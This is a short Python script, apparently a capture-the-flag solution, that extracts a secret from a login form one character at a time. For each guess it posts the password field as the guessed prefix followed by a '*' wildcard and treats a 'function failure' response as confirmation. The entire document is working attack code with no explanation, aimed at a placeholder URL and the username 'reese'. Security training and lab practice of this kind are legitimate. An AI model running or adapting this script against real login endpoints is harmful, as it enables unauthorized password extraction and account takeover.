#!/usr/bin/env python3

import requests
import string

flag = ''
url = "http://<URL>/login"
characters = string.ascii_letters + string.digits + '_@{}-/!"$%=^[]:;'
s = requests.Session()

while True:
    for i in characters:
        data = f"username=reese&password={flag + i}*"
        headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
        attempt = s.post(url, headers=headers, data=data)
        print(f"[?]\t{flag + i}")
        if "function failure" in attempt.text:
            flag = flag + i
            print(f"[!]\t{flag}")
            if i == "}":
                exit(f"\n[!]\t{flag}")
